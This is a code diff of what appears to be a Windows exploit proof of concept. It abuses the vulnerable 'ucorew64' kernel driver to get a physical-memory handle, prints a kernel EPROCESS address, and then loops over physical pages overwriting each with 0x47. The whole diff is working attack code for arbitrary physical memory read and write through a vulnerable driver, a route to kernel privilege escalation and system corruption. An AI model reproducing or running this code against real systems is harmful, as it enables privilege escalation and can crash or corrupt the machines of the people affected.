@@ -95,36 +95,12 @@ LPVOID ntoskernl_base(void) {
 int main(char argc, char** argv)
 {
 	printf("\n\n\nEPROCESS_adress: %p\n", EPROCESS_address(ntoskernl_base()));
-	HANDLE device = INVALID_HANDLE_VALUE;
-	NTSTATUS status = FALSE;
-	DWORD bytesReturned = 0;
-	Phys32Struct phys32Struct = { 0 };
-
-
-	device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
-
-	if (device == INVALID_HANDLE_VALUE)
-	{
-		fprintf(stderr, "> Could not open device: 0x%X\n", GetLastError());
-		return FALSE;
+	HANDLE hPhys = nullptr;
+	hPhys = GetDevicePhysicalMemoryHandle(L"\\\\.\\ucorew64");
+	if (hPhys == NULL) {
+		fprintf(stderr, "Could not obtain Device PhysicalMemory\n");
+		exit(EXIT_FAILURE);
 	}
-
-	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
-	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, &phys32Struct, sizeof(phys32Struct), &phys32Struct, sizeof(phys32Struct), &bytesReturned, (LPOVERLAPPED)NULL);
-	if (status == FALSE) {
-		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
-		return EXIT_FAILURE;
-	}
-
-
-	printf("[*] IOCTL_MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", IOCTL_MapPhysicalMemoryToLinearSpace);
-	printf("[*] Buffer from the kernel land:\n");
-	printf("phys32Struct.dwPhysMemSizeInBytes: %lld\n", phys32Struct.dwPhysMemSizeInBytes);
-	printf("phys32Struct.PhysicalMemoryHandle: %p\n", phys32Struct.PhysicalMemoryHandle);
-	printf("phys32Struct.pvPhysAddress: %p\n", phys32Struct.pvPhysAddress);
-	printf("phys32Struct.pvPhysMemLin: %p\n", phys32Struct.pvPhysMemLin);
-
-	system("pause");
 
 	PDWORD64 buf = (PDWORD64)malloc(0x1000);
 	if (buf == 0) {
@@ -132,14 +108,13 @@ int main(char argc, char** argv)
 	}
 
 	for (__int64 page = 0; page < 0x7FFFFFFFFFFF; page = page + 0x1000) {
-		MapPhysicalMemory(phys32Struct.PhysicalMemoryHandle, page, 0x1000, buf);
+		MapPhysicalMemory(hPhys, page, 0x1000, buf);
 		memset(buf, 0x47, 0x1000);
 		printf("Set %lld to 0x47: \n", page);
 	}
 
 	free(buf);
 
-	CloseHandle(phys32Struct.PhysicalMemoryHandle);
-	CloseHandle(device);
+	CloseHandle(hPhys);
 	return EXIT_SUCCESS;
 }
